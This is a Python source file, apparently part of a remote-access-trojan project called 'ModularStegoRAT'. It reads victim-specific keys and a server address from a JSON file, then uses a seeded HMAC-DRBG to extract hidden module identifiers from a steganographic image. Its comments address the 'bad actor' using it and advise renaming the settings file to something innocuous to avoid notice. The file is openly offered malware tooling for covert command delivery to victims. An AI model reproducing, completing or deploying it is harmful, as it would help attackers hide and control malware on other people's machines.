import os
import json
import hmac
import base64
import socket
import hashlib
from PIL import Image
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric.ec import EllipticCurvePublicKey, EllipticCurvePrivateKey

"""
- The following variables are dependent on the victim
- These should be set for the bad actor using them
- For testing they are loaded in from a JSON file - this is also a valid option
- If this is forked for use, the JSON file name should be updated to smth more innocuous
"""
JSON_NAME = "VictimSettings.JSON"

#Setup variables
NO_BYTES_PER_MODULE = 2

class HMAC_DRBG:
    def __init__(self, seed: bytes):
        self.K = b"\x00" * 32
        self.V = b"\x01" * 32
        self._update(seed)

    def _hmac(self, key, data):
        return hmac.new(key, data, hashlib.sha256).digest()

    def _update(self, seed=b""):
        self.K = self._hmac(self.K, self.V + b"\x00" + seed)
        self.V = self._hmac(self.K, self.V)
        if seed:
            self.K = self._hmac(self.K, self.V + b"\x01" + seed)
            self.V = self._hmac(self.K, self.V)

    def randbytes(self, n):
        output = b""
        while len(output) < n:
            self.V = self._hmac(self.K, self.V)
            output += self.V
        self._update()
        return output[:n]

    def randint(self, maxExclusive):
        raw = self.randbytes(4)
        return int.from_bytes(raw, "big") % maxExclusive

def LoadSettingsFromJSON(jsonName : str) -> tuple[str, tuple[str, int]]:
    jsonPath = os.path.join(os.getcwd(), jsonName)
    with open(jsonPath, "r") as f:
        jsonDict = json.load(f)
    
    victimBytesHex = jsonDict["Hex"]
    serverAddress = jsonDict["Address"]
    portAddress = int(jsonDict["Port"])
    
    return (victimBytesHex, (serverAddress, portAddress))

def ExtractFromStego(stegoPath : str):
    stego = Image.open(stegoPath).convert("RGB")
    sizeX, sizeY = stego.size
    availablePixels = [(i,j) for i in range(sizeX) for j in range(sizeY)]
    
    #Step 1 - load the stegoBytesHex seed for the DRBG
    stegoBytesHexStrListForm = []
    
    for i in range(128):
        stegoBytesHexStrListForm.append(
            str(
                stego.getpixel((i,0))[0] % 2
            )
        )
        availablePixels.remove((i,0))
        
    stegoBytesHex = int("".join(stegoBytesHexStrListForm) ,2).to_bytes(16, "big")
    drbgSeed = bytes.fromhex(victimBytesHex) + stegoBytesHex
    drbg = HMAC_DRBG(drbgSeed)
    
    #Step 2 - read the ciphertext
    message = []
    
    extracting = True
    while(extracting):
        pixelPosition = availablePixels[drbg.randint(len(availablePixels))]
        availablePixels.remove(pixelPosition)  
        channel = drbg.randint(3)
        
        message.append(
            str(
                stego.getpixel(pixelPosition)[channel] % 2
            )
        )
        
        if((len(message) % (8 * NO_BYTES_PER_MODULE) == 0) and (message[-NO_BYTES_PER_MODULE * 8:] == ["0"] * (NO_BYTES_PER_MODULE * 8))):
            extracting = False

    #Step 3 - turn the message into a list of modules
    moduleInfo = message[:-(8 * NO_BYTES_PER_MODULE)]
    modules = []
    
    for i in range(len(moduleInfo) // (8 * NO_BYTES_PER_MODULE)):
        moduleList = moduleInfo[i * 8 * NO_BYTES_PER_MODULE : (i + 1) * 8 * NO_BYTES_PER_MODULE]
        moduleStr = "".join(moduleList)
        module = int(moduleStr, 2)
        modules.append(module)
    
    print(modules)

#Loading in the JSON stuff
victimBytesHex, (serverAddress, serverPort) = LoadSettingsFromJSON(JSON_NAME)
ExtractFromStego(r"C:\Users\iniga\OneDrive\Programming\ModularStegoRAT\Stegos\1Stego.png")